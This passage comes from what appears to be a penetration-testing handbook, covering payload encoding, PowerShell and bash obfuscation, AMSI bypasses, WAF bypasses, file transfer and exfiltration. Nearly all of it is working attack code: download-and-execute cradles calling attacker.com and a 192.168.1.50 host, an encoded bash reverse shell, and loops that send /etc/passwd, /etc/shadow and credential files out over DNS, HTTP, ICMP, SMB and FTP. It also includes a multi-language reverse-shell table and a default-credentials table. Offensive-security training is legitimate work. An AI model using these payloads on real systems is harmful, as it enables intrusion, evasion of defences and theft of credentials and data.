[System.Web.HttpUtility]::UrlEncode("payload string")
[uri]::EscapeDataString("payload string")

# Use case: SQL injection, XSS, parameter tampering, bypassing WAF rules
# that check for literal special characters
```

#### Double URL Encoding

```bash
# Encode the percent sign itself
# First encoding:  /etc/passwd → %2Fetc%2Fpasswd
# Double encoding: %2Fetc%2Fpasswd → %252Fetc%252Fpasswd
# (% becomes %25)

python3 -c "import urllib.parse; s='cat /etc/passwd'; print(urllib.parse.quote(urllib.parse.quote(s)))"

# Use case: path traversal bypass when front-end proxy decodes once before
# passing to back-end. The back-end performs second decode, yielding
# original payload. IIS double-decode vulnerability (CVE-2001-0333).
```

#### HTML Entities

```bash
# Common HTML entity encodings
# < = &lt; or &#60; or &#x3c;
# > = &gt; or &#62; or &#x3e;
# " = &quot; or &#34;
# ' = &#39; or &apos;
# & = &amp;
# / = &#47; or &#x2f;

# Python encode all chars to decimal entities
python3 -c "print(''.join(f'&#{ord(c)};' for c in '<script>alert(1)</script>'))"

# Use case: XSS bypass when angle brackets are filtered but HTML context
# allows entities (attribute event handlers, etc.)
```

#### Unicode Notation

```bash
# Unicode escape in JavaScript
# A = \u0041, / = \u002f, . = \u002e
python3 -c "print(''.join(f'\\\\u{ord(c):04x}' for c in 'alert(1)'))"
# Use in JS context: eval('\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0029')

# Unicode in URL (overlong UTF-8 bypass)
# / = %c0%af (overlong encoding, rejected by RFC but some parsers accept)
# Use case: path traversal bypass, Unicode normalization attacks

# Python unicode normalize
python3 -c "import unicodedata; print(unicodedata.normalize('NFC', '\uff0f'))"
```

#### Hex Notation

```bash
# Linux — hex encode string
echo -n 'cat /etc/passwd' | xxd -p | tr -d '\n'
echo -n 'payload' | od -A n -t x1 | tr -d ' \n'

# Linux — hex decode
echo '636174202f6574632f706173737764' | xxd -r -p

# Bash hex execution
$'\x63\x61\x74\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64'
# cat /etc/passwd in bash hex string

# Use case: evading string matching in IDS/WAF, encoding shellcode,
# embedding non-printable bytes in payloads
```

#### Octal (Bash)

```bash
# Bash octal string execution
$'\143\141\164\040\057\145\164\143\057\160\141\163\163\167\144'
# cat /etc/passwd in octal

# Convert to octal
python3 -c "print(''.join(f'\\\\{oct(ord(c))[2:]}' for c in 'cat /etc/passwd'))"

# Use case: WAF/filter bypass in bash contexts where hex is detected but
# octal is not filtered
```

#### Null Bytes

```bash
# Null byte in URL
%00
%2500  # double encoded null

# Null byte in Python string
python3 -c "print('file.php\x00.jpg')"

# Use case: file extension bypass — some PHP/legacy systems terminate the
# string at the null byte, treating "shell.php%00.jpg" as "shell.php".
# Parser truncation attacks. Old Perl/C CGI handlers.

# Null byte in SQL
' OR 1=1%00--
```

---

### 17.2 PowerShell Obfuscation

```bash
# Encoded command pattern — generate base64 and execute
# Linux (generates UTF-16LE encoded PS command):
PAYLOAD='IEX(New-Object Net.WebClient).DownloadString("http://192.168.1.50/payload.ps1")'
ENCODED=$(echo -n "$PAYLOAD" | iconv -f UTF-8 -t UTF-16LE | base64 -w 0)
echo "powershell -enc $ENCODED"

# Windows PowerShell execution
powershell -EncodedCommand [BASE64_STRING]
powershell -enc [BASE64_STRING]
powershell -e [BASE64_STRING]    # abbreviated
```

```powershell
# String concatenation — evade keyword matching
# Instead of "IEX", use:
$x = "I" + "EX"
&([scriptblock]::Create($x + "(New-Object Net.WebClient).DownloadString('http://attacker.com/p.ps1')"))

# Tick mark insertion (valid PS, ignored by parser)
I`E`X(New-Object Net.WebClient).DownloadString('http://attacker.com/p.ps1')
i`nv`oke-`expr`ession (New-Object Net.WebClient).DownloadString('http://attacker.com/p.ps1')

# Variable substitution
$c = 'DownloadString'; (New-Object Net.WebClient).$c('http://attacker.com/p.ps1') | IEX

# Case variation (PowerShell is case-insensitive)
iNvOkE-ExPrEsSiOn (NeW-oBjEcT nEt.wEbClIeNt).dOwNlOaDsTrInG('http://attacker.com/p.ps1')
```

```powershell
# AMSI bypass — amsiInitFailed (public documented bypass, works on unpatched PS5)
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils') | ForEach-Object {
    $_.GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
}

# AMSI bypass — via reflection (documented, patched in some PS versions)
$a=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
$b=$a.GetField('amsiContext',[Reflection.BindingFlags]'NonPublic,Static')
$c=$b.GetValue($null)
[Runtime.InteropServices.Marshal]::WriteInt32([IntPtr]$c,0x41424344)

# Note: AMSI bypass effectiveness depends on Windows Defender definition version.
# These are publicly documented patterns. Defender may flag them.
```

```powershell
# Download cradle — WebClient DownloadFile
(New-Object System.Net.WebClient).DownloadFile('http://192.168.1.50/payload.exe','C:\Windows\Temp\payload.exe')

# Download cradle — Invoke-WebRequest (iwr)
Invoke-WebRequest -Uri 'http://192.168.1.50/payload.exe' -OutFile 'C:\Windows\Temp\payload.exe'
iwr 'http://192.168.1.50/payload.exe' -OutFile 'C:\Windows\Temp\payload.exe'

# Download cradle — in-memory execution (no disk write)
IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.50/payload.ps1')
IEX ([System.Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('[BASE64_ENCODED_SCRIPT]')))
```

---

### 17.3 Linux Shell Obfuscation

```bash
# IFS substitution — use IFS variable as delimiter
IFS=/ command -v cat
cat$IFS/etc/passwd
c${IFS}at /etc/passwd         # breaks "cat" keyword detection

# Wildcard expansion — avoid typing full paths
/???/cat /etc/passwd          # matches /bin/cat, /usr/cat, etc.
/???/p?sswd                   # matches /etc/passwd
/?in/?at /etc/passwd

# Brace expansion — reconstruct commands
{ca,t} /etc/passwd            # expands to: ca t /etc/passwd (not useful)
# Better: split and assign
X="cat /etc/passwd"; $X

# $() command nesting
echo $(cat /etc/passwd)
$(echo cat) /etc/passwd

# base64 decode and execute chain
echo "Y2F0IC9ldGMvcGFzc3dk" | base64 -d | bash
echo "d2hvYW1p" | base64 -d | sh

# printf hex decode chain
printf '\x63\x61\x74\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64' | bash

# Combine techniques — obfuscate bash reverse shell
bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuNTAvNDQ0NCAwPiYx}|{base64,-d}|bash

# Slash substitution via variable
A=/;cat ${A}etc${A}passwd

# Apostrophe insertion (ignored by bash)
c'a't /etc/passwd
/bi'n'/cat /etc/passwd

# Backslash continuation (ignored in command names)
c\at /etc/passwd

# Redirect and read via /dev/stdin
cat < /etc/passwd
```

---

### 17.4 WAF/Filter Bypass Patterns (General)

```bash
# Case variation (effective on Windows file systems and case-insensitive apps)
# Instead of: SELECT * FROM users
SeLeCt * FrOm UsErS
SELECT%20*%20FROM%20USERS
select * from Users

# Comment injection (MySQL, PostgreSQL)
SELECT/**/1/**/FROM/**/users
SELECT/*!*/1/*!*/FROM/*!*/users   # MySQL conditional comment
SELECT%0A1%0AFROM%0Ausers         # newline as whitespace alternative

# %0a = newline, %09 = tab, %0d = carriage return (whitespace alternatives)
SELECT%091%09FROM%09users

# Concatenation operators (reconstruct filtered strings)
# MySQL:     CONCAT('SEL','ECT')
# MSSQL:     'SEL'+'ECT'
# Oracle:    'SEL'||'ECT'
# PostgreSQL: 'SEL'||'ECT'

# Double encoding (as covered in 17.1)
# <script> → %3cscript%3e → %253cscript%253e

# Unicode normalization bypass
# Some WAFs normalize Unicode before comparison — test with:
# ＜script＞ (fullwidth less-than / greater-than, U+FF1C / U+FF1E)
# ﹤script﹥ (small angle brackets U+FE64 / U+FE65)

# Null byte injection to truncate WAF pattern matching
' OR 1=1%00
<scr%00ipt>alert(1)</scr%00ipt>

# HTTP Parameter Pollution (HPP) — duplicate parameters
GET /search?q=union&q=select&q=1,2,3 HTTP/1.1
# Some servers concatenate: q=unionselect1,2,3

# Chunked encoding bypass (Transfer-Encoding: chunked HTTP request smuggling)
# Used in complex WAF bypass scenarios — see OWASP HTTP Request Smuggling
```

---

## SECTION 18: FILE TRANSFER METHODS

### 18.1 Linux Download Methods

```bash
# wget — standard download
wget http://192.168.1.50/payload.elf -O /tmp/payload.elf
wget -q http://192.168.1.50/payload.elf -O /tmp/payload.elf  # quiet mode

# wget — from behind basic auth
wget --user=admin --password=Password1 http://192.168.1.50/payload.elf -O /tmp/p.elf

# wget — continue interrupted download
wget -c http://192.168.1.50/largefile.bin -O /tmp/largefile.bin

# curl — download to file
curl http://192.168.1.50/payload.elf -o /tmp/payload.elf
curl -s http://192.168.1.50/payload.elf -o /tmp/payload.elf  # silent

# curl — download and execute in memory (no disk write)
curl -s http://192.168.1.50/payload.sh | bash

# curl — follow redirects
curl -L http://192.168.1.50/payload.elf -o /tmp/payload.elf

# Python3 http.server — attacker side (serve files)
python3 -m http.server 8080
python3 -m http.server 8080 --bind 0.0.0.0  # explicit bind

# Python3 urllib — target side (download)
python3 -c "import urllib.request; urllib.request.urlretrieve('http://192.168.1.50:8080/payload.elf', '/tmp/payload.elf')"

# Python3 wget equivalent
python3 -c "
import urllib.request
urllib.request.urlretrieve('http://192.168.1.50:8080/p.sh', '/tmp/p.sh')
"

# nc — receive file (listener side, attacker)
nc -lvnp 9001 > received_file.bin

# nc — send file (target side)
nc 192.168.1.50 9001 < /etc/passwd

# nc — send file with progress (target)
pv /etc/passwd | nc 192.168.1.50 9001

# scp — copy file from target
scp user@192.168.1.100:/etc/passwd /tmp/passwd_copy

# scp — copy file to target
scp payload.elf user@192.168.1.100:/tmp/payload.elf

# scp — with specific key
scp -i id_rsa payload.elf user@192.168.1.100:/tmp/payload.elf

# /dev/tcp bash method (no external tools required)
# Download to file:
bash -c 'exec 3<>/dev/tcp/192.168.1.50/8080; echo -e "GET /payload.elf HTTP/1.0\r\nHost: 192.168.1.50\r\n\r\n" >&3; cat <&3 > /tmp/payload.elf'

# /dev/tcp receive (strip HTTP headers):
bash -c 'exec 3<>/dev/tcp/192.168.1.50/8080; echo -e "GET /p.sh HTTP/1.0\r\nHost: 192.168.1.50\r\n\r\n" >&3; tail -n +7 <&3 | bash'
```

---

### 18.2 Windows Download Methods

```powershell
# PowerShell DownloadFile
(New-Object System.Net.WebClient).DownloadFile('http://192.168.1.50/payload.exe','C:\Windows\Temp\payload.exe')

# PowerShell Invoke-WebRequest
Invoke-WebRequest -Uri 'http://192.168.1.50/payload.exe' -OutFile 'C:\Windows\Temp\payload.exe'
iwr -Uri 'http://192.168.1.50/payload.exe' -OutFile 'C:\Windows\Temp\payload.exe'

# PowerShell with proxy bypass
(New-Object System.Net.WebClient).Proxy = $null
(New-Object System.Net.WebClient).DownloadFile('http://192.168.1.50/payload.exe','C:\Windows\Temp\payload.exe')

# PowerShell DownloadString — in-memory execution (no disk write)
IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.50/payload.ps1')
Invoke-Expression (New-Object Net.WebClient).DownloadString('http://192.168.1.50/payload.ps1')
```

```cmd
:: certutil — download (often logged by Defender/EDR)
certutil -urlcache -split -f http://192.168.1.50/payload.exe C:\Windows\Temp\payload.exe

:: certutil — decode base64 file
certutil -decode b64.txt payload.exe

:: bitsadmin — background download
bitsadmin /transfer myJob /download /priority normal http://192.168.1.50/payload.exe C:\Windows\Temp\payload.exe

:: bitsadmin — full syntax
bitsadmin /create myJob
bitsadmin /addfile myJob http://192.168.1.50/payload.exe C:\Windows\Temp\payload.exe
bitsadmin /resume myJob
bitsadmin /complete myJob
```

```cmd
:: mshta — execute remote HTA (HTML Application)
mshta http://192.168.1.50/payload.hta
:: payload.hta content example:
:: <script language="VBScript">
:: CreateObject("WScript.Shell").Run "powershell -enc [BASE64]"
:: </script>

:: regsvr32 — COM scriptlet execution (Squiblydoo, LOLBIN)
regsvr32 /s /n /u /i:http://192.168.1.50/payload.sct scrobj.dll
:: payload.sct is an XML COM scriptlet file with embedded script

:: curl.exe — Windows 10 1803+ built-in curl
curl.exe -o C:\Windows\Temp\payload.exe http://192.168.1.50/payload.exe
curl.exe http://192.168.1.50/payload.ps1 | powershell -
```

---

### 18.3 Exfiltration Methods

```bash
# DNS exfiltration — base64 chunk loop (no direct network egress required, only DNS)
# Attacker: start a DNS server or use Burp Collaborator / interactsh
# Target (Linux):
for chunk in $(cat /etc/passwd | base64 | tr -d '\n' | fold -w 30); do
    nslookup $chunk.exfil.attacker.com 192.168.1.50
done

# Windows DNS exfiltration (PowerShell)
$data = [Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\Users\user\Desktop\creds.txt"))
$chunks = $data -split '(.{50})' | Where-Object { $_ }
foreach ($chunk in $chunks) {
    Resolve-DnsName "$chunk.exfil.attacker.com" -ErrorAction SilentlyContinue
}

# HTTP POST exfiltration (curl)
curl -X POST http://192.168.1.50:8080/upload -d @/etc/passwd
curl -X POST http://192.168.1.50:8080/upload -F "file=@/etc/shadow"
# Attacker listener: python3 -m http.server 8080 (or a POST-capable server)

# Netcat HTTP POST receiver (attacker side)
python3 -c "
from http.server import HTTPServer, BaseHTTPRequestHandler
class H(BaseHTTPRequestHandler):
    def do_POST(self):
        l = int(self.headers['Content-Length'])
        data = self.rfile.read(l)
        open('received.txt','ab').write(data)
        self.send_response(200)
        self.end_headers()
HTTPServer(('0.0.0.0',8080),H).serve_forever()
"

# ICMP exfiltration (hping3)
# Embed data in ICMP data field (requires root on both ends)
hping3 --icmp --data 64 --sign exfil --file /etc/passwd 192.168.1.50

# hping3 — manual data in ICMP
echo "secret_data_chunk" | hping3 --icmp -d 40 --sign mymark 192.168.1.50

# SMB share copy exfiltration
# Mount share on attacker:
# impacket-smbserver sharename /tmp/exfil -smb2support
# Target copies to share:
copy C:\Users\user\Desktop\creds.txt \\192.168.1.50\sharename\creds.txt

# FTP script exfiltration (target → attacker FTP)
# Attacker: python3 -m pyftpdlib -w -p 21
ftp -n 192.168.1.50 <<EOF
quote USER anonymous
quote PASS anonymous
put /etc/passwd
quit
EOF

# Chunked exfiltration for size limits (split into 50KB chunks)
split -b 50k /path/to/largefile chunk_
for f in chunk_*; do
    curl -X POST http://192.168.1.50:8080/upload -F "chunk=@$f" -F "name=$f"
done

# Windows chunked exfil (PowerShell)
$file = [IO.File]::ReadAllBytes("C:\path\to\file.zip")
$chunkSize = 51200  # 50KB
$i = 0
while ($i -lt $file.Length) {
    $chunk = $file[$i..([Math]::Min($i+$chunkSize-1,$file.Length-1))]
    $b64 = [Convert]::ToBase64String($chunk)
    Invoke-WebRequest -Uri "http://192.168.1.50:8080/chunk?seq=$($i/$chunkSize)" -Method POST -Body $b64
    $i += $chunkSize
}
```

---

## SECTION 19: QUICK REFERENCE TABLES

### Table 1: Common Ports and Default Services

| Port | Protocol | Service | Default Credentials / Notes |
|------|----------|---------|-------------------------------|
| 21 | TCP | FTP | anonymous/anonymous, admin/admin |
| 22 | TCP | SSH | root/root, admin/admin (vary by device) |
| 23 | TCP | Telnet | admin/admin, admin/(blank), cisco/cisco |
| 25 | TCP | SMTP | N/A — check for open relay, VRFY enum |
| 53 | TCP/UDP | DNS | N/A — check zone transfer (AXFR) |
| 69 | UDP | TFTP | No auth — check for readable/writable files |
| 80 | TCP | HTTP | admin/admin — check for web apps |
| 110 | TCP | POP3 | N/A — email retrieval, brute force users |
| 111 | TCP/UDP | RPCbind/Portmapper | N/A — enumerate RPC services |
| 135 | TCP | MSRPC | N/A — used by DCOM, WMI, RPC endpoint mapper |
| 137 | UDP | NetBIOS Name Service | N/A — hostname/workgroup discovery |
| 139 | TCP | NetBIOS Session | N/A — legacy SMB |
| 143 | TCP | IMAP | N/A — email, brute force |
| 161 | UDP | SNMP | public, private — default community strings |
| 162 | UDP | SNMP Trap | N/A — inbound traps |
| 389 | TCP | LDAP | N/A — null bind, user enumeration |
| 443 | TCP | HTTPS | admin/admin — check for web apps |
| 445 | TCP | SMB (Direct) | admin/admin, admin/(blank) |
| 465 | TCP | SMTP TLS | N/A — check open relay over TLS |
| 500 | UDP | IKE/VPN | N/A — IPSec VPN, pre-shared key attacks |
| 514 | UDP | Syslog | No auth — log injection, info gather |
| 587 | TCP | SMTP Submission | Requires auth — but check relay anyway |
| 631 | TCP | CUPS/IPP | N/A — printer admin, sometimes unauthed |
| 636 | TCP | LDAPS | N/A — LDAP over TLS |
| 873 | TCP | rsync | No auth often — check for readable modules |
| 993 | TCP | IMAPS | N/A — IMAP over TLS |
| 995 | TCP | POP3S | N/A — POP3 over TLS |
| 1099 | TCP | Java RMI | No auth — RMI deserialization RCE |
| 1433 | TCP | MSSQL | sa/(blank), sa/sa |
| 1521 | TCP | Oracle DB | system/manager, sys/change_on_install |
| 1723 | TCP | PPTP VPN | N/A — MS-CHAPv2 capture/crack |
| 2049 | TCP/UDP | NFS | No auth often — check exports |
| 2375 | TCP | Docker (unauth) | No auth — full container control |
| 2376 | TCP | Docker TLS | Client cert required — check cert validation |
| 3000 | TCP | Grafana/Node dev | admin/admin (Grafana default) |
| 3306 | TCP | MySQL | root/(blank), root/root |
| 3389 | TCP | RDP | administrator/Administrator1 |
| 4444 | TCP | Metasploit default | N/A — listener/payload indicator |
| 5432 | TCP | PostgreSQL | postgres/postgres, postgres/(blank) |
| 5900 | TCP | VNC | admin/(blank), admin/admin |
| 5985 | TCP | WinRM HTTP | N/A — domain credentials |
| 5986 | TCP | WinRM HTTPS | N/A — domain credentials |
| 6379 | TCP | Redis | No auth common — config write RCE |
| 6443 | TCP | Kubernetes API | N/A — check for anonymous access |
| 7001 | TCP | WebLogic | weblogic/weblogic, weblogic/welcome1 |
| 8080 | TCP | HTTP Alternate | admin/admin — Jenkins, Tomcat, dev apps |
| 8443 | TCP | HTTPS Alternate | admin/admin — management interfaces |
| 8888 | TCP | Jupyter Notebook | Token in URL — check for unprotected |
| 9200 | TCP | Elasticsearch | No auth by default (pre-8.x) |
| 9300 | TCP | Elasticsearch cluster | N/A — inter-node communication |
| 11211 | TCP/UDP | Memcached | No auth — data dump, cache poisoning |
| 27017 | TCP | MongoDB | No auth (pre-3.6 default) |
| 27018 | TCP | MongoDB (shard) | No auth often |
| 50000 | TCP | SAP Dispatcher | N/A — SAP RFC calls |

---

### Table 2: Default Credentials Reference

| Service / Device | Default Username | Default Password | Notes |
|------------------|-----------------|-----------------|-------|
| Cisco IOS router | admin | cisco | Also try: cisco/cisco, (blank)/(blank) |
| Cisco switch | cisco | cisco | Enable password often also "cisco" |
| Juniper router | root | (blank) | Root with no password, CLI only |
| Netgear router | admin | password | Also admin/admin |
| D-Link router | admin | admin | Also admin/(blank) |
| TP-Link router | admin | admin | Modern firmware forces password change |
| Ubiquiti UniFi | ubnt | ubnt | Applies to EdgeOS devices |
| Fortinet FortiGate | admin | (blank) | FortiOS — prompt to change on first login |
| Palo Alto PAN-OS | admin | admin | Forced change on setup |
| MySQL / MariaDB | root | (blank) | Default install, no password set |
| MSSQL | sa | (blank) | SA account, often blank on old installs |
| PostgreSQL | postgres | postgres | Or postgres/(blank) |
| MongoDB | (blank) | (blank) | Pre-3.6: no auth by default |
| Redis | (blank) | (blank) | No auth by default; requirepass not set |
| Elasticsearch | elastic | changeme | Pre-8.x often no auth at all |
| CouchDB | admin | admin | Or no auth on localhost |
| Cassandra | cassandra | cassandra | Default superuser |
| RabbitMQ | guest | guest | Restricted to localhost by default |
| VNC | (blank) | (blank) | Or admin/(blank) — varies by setup |
| VMware ESXi | root | (blank) | Default install blank root password |
| VMware vCenter | administrator@vsphere.local | vmware | Or: Admin/Admin |
| Dell iDRAC | root | calvin | Consistent across Dell servers |
| HP iLO | Administrator | (printed on sticker) | 8-char on service tag or blank |
| Supermicro IPMI | ADMIN | ADMIN | Very consistent |
| IBM IMM/XCC | USERID | PASSW0RD | Note capital O as zero |
| Apache Tomcat | tomcat | tomcat | Also: admin/admin, role: manager-gui |
| Jenkins | admin | [initial setup key] | Key in /var/jenkins_home/secrets/initialAdminPassword |
| GitLab | root | 5iveL!fe | Older versions; now random on install |
| Grafana | admin | admin | Forces change on first login |
| Kibana | elastic | changeme | Same as Elasticsearch credentials |
| Printer (HP) | admin | admin | Also: admin/1234 |
| Printer (Ricoh) | admin | (blank) | Or admin/password |
| Printer (Xerox) | admin | 1111 | Web interface |
| Phpmyadmin | root | (blank) | If MySQL root has no password |
| SNMP community | public | N/A | Also try: private, community, manager |

---

### Table 3: Reverse Shell One-Liner Reference

| Language / Method | One-Liner | Notes |
|------------------|-----------|-------|
| Bash /dev/tcp | `bash -i >& /dev/tcp/[IP]/[PORT] 0>&1` | Most reliable on Linux. Requires bash (not sh). |
| Bash mkfifo | `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f\|/bin/sh -i 2>&1\|nc [IP] [PORT] >/tmp/f` | Works when /dev/tcp not available |
| Python3 | `python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("[IP]",[PORT]));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'` | Very portable across Linux distros |
| PHP | `php -r '$sock=fsockopen("[IP]",[PORT]);exec("/bin/sh -i <&3 >&3 2>&3");'` | Requires PHP CLI. Change fd if needed. |
| PHP (proc_open) | `php -r '$s=fsockopen("[IP]",[PORT]);$proc=proc_open("/bin/sh -i",array(0=>$s,1=>$s,2=>$s),$pipes);'` | Alternative when exec is disabled |
| Perl | `perl -e 'use Socket;$i="[IP]";$p=[PORT];socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");'` | Perl often available on legacy systems |
| Ruby | `ruby -rsocket -e'f=TCPSocket.open("[IP]",[PORT]).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'` | Available on many Unix systems |
| Netcat (with -e) | `nc [IP] [PORT] -e /bin/sh` | Traditional netcat. Not available in OpenBSD nc. |
| Netcat mkfifo | `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f\|sh -i 2>&1\|nc [IP] [PORT] >/tmp/f` | Works with OpenBSD/ncat |
| Socat | `socat TCP:[IP]:[PORT] EXEC:'/bin/bash -li',pty,stderr,setsid,sigint,sane` | Full PTY. Best interactive shell. Requires socat. |
| Socat (listener) | `socat file:\`tty\`,raw,echo=0 TCP-LISTEN:[PORT]` | Attacker side for full TTY |
| PowerShell TCP | `powershell -NoP -NonI -W Hidden -Exec Bypass -Command $client=New-Object System.Net.Sockets.TCPClient("[IP]",[PORT]);$stream=$client.GetStream();[byte[]]$bytes=0..65535\|%{0};while(($i=$stream.Read($bytes,0,$bytes.Length)) -ne 0){;$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2>&1\|Out-String );$sendback2=$sendback+"PS "+(pwd).Path+"> ";$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()` | Windows PowerShell reverse shell |
| PowerShell IEX | `powershell -enc [BASE64_OF_SCRIPT]` | Encode above script and execute via -enc |
| Java | `r = Runtime.getRuntime(); p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/[IP]/[PORT];cat <&5\|while read line; do $line 2>&5 >&5; done"] as String[]); p.waitFor();` | Useful in SSTI/deserialization RCE |
| Golang | `package main;import("os/exec";"net");func main(){c,_:=net.Dial("tcp","[IP]:[PORT]");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}` | Compile with: go build -o shell main.go |

---

### Table 4: Nmap Quick Reference

| Scan Type | Command | When to Use |
|-----------|---------|-------------|
| Host discovery only | `nmap -sn [range]` | Initial recon, no port scan |
| ARP sweep (LAN) | `nmap -PR -sn [range]` | Local network discovery |
| Quick top 100 ports | `nmap -T4 -F [target]` | Rapid first-pass of single host |
| SYN scan (default) | `nmap -sS -T4 [target]` | Standard stealthy port scan (root) |
| TCP connect scan | `nmap -sT -T4 [target]` | No root needed; noisier |
| Version detection | `nmap -sV [target]` | After open ports identified |
| OS detection | `nmap -O [target]` | Guess OS (root required) |
| Default scripts | `nmap -sC [target]` | Safe NSE scripts for enumeration |
| Aggressive scan | `nmap -A [target]` | -sV + -O + -sC + traceroute |
| Full port scan | `nmap -p- [target]` | All 65535 ports; slow |
| UDP top 100 | `nmap -sU --top-ports 100 [target]` | SNMP, TFTP, DNS, NFS discovery |
| Vuln scripts | `nmap --script vuln [target]` | Known CVE detection |
| SMB vulns | `nmap --script smb-vuln-* -p 445 [target]` | MS17-010, MS08-067, etc. |
| Firewall evasion (frag) | `nmap -f [target]` | Fragment packets to evade IDS |
| Decoy scan | `nmap -D RND:10 [target]` | Spoof source IPs with decoys |
| Slow scan (IDS evasion) | `nmap -T1 [target]` | Paranoid timing — very slow |
| Output all formats | `nmap [target] -oA output_prefix` | Save .nmap, .xml, .gnmap |
| Script with args | `nmap --script [script] --script-args user=admin,pass=Password1 [target]` | Pass credentials to scripts |

---

### Table 5: Wordlists Reference

| Resource | Path / Location | Contents | Best Use |
|----------|----------------|----------|----------|
| rockyou.txt | `/usr/share/wordlists/rockyou.txt` | ~14M common passwords from 2009 RockYou breach | Password cracking, brute force |
| SecLists web paths | `/usr/share/seclists/Discovery/Web-Content/` | common.txt, raft-large-files.txt, dirsearch.txt | Directory/file bruteforce (gobuster, ffuf) |
| SecLists API endpoints | `/usr/share/seclists/Discovery/Web-Content/api/` | api_endpoints.txt, swagger.txt | REST API endpoint discovery |
| SecLists subdomains | `/usr/share/seclists/Discovery/DNS/` | subdomains-top1million-5000.txt, fierce-hostlist.txt | Subdomain brute force (gobuster dns, dnsx) |
| SecLists usernames | `/usr/share/seclists/Usernames/` | top-usernames-shortlist.txt, xato-net-10-million-usernames.txt | Username enumeration, brute force |
| SecLists default creds | `/usr/share/seclists/Passwords/Default-Credentials/` | default-passwords.csv, ftp-betterdefaultpasslist.txt | Default credential stuffing |
| SecLists fuzzing | `/usr/share/seclists/Fuzzing/` | LFI-gracefulsecurity-linux.txt, SQLi payloads, XSS | Parameter fuzzing, injection testing |
| hashcat best64.rule | `/usr/share/hashcat/rules/best64.rule` | 64 common mangling rules (append numbers/symbols) | Fast password rule-based cracking |
| hashcat rockyou-30000 | `/usr/share/hashcat/rules/rockyou-30000.rule` | 30,000 rules derived from rockyou analysis | Thorough rule-based cracking |
| OneRuleToRuleThemAll | Download from GitHub: NotSoSecure/password_cracking_rules | ~52,000 rules, community compiled | Comprehensive rule-based cracking |
| Metasploit usernames | `/usr/share/metasploit-framework/data/wordlists/unix_users.txt` | Common Unix usernames | SSH/SMTP/SNMP user enumeration |
| Metasploit passwords | `/usr/share/metasploit-framework/data/wordlists/unix_passwords.txt` | Common Unix passwords | Service brute force |
| CeWL (custom) | `cewl http://target.com -d 3 -m 6 -w cewl_output.txt` | Website-specific wordlist | Targeted password attacks |
| Crunch (custom) | `crunch 8 12 abcdefghijklmnopqrstuvwxyz0123456789 -o custom.txt` | Pattern-based wordlists | Mask attacks, known password patterns |

---

*Part 3 of 4 — Network attacks and encoding/obfuscation. SE payloads are covered in the SE Handbook (companion volume) with cross-references in Appendix A of this book.*
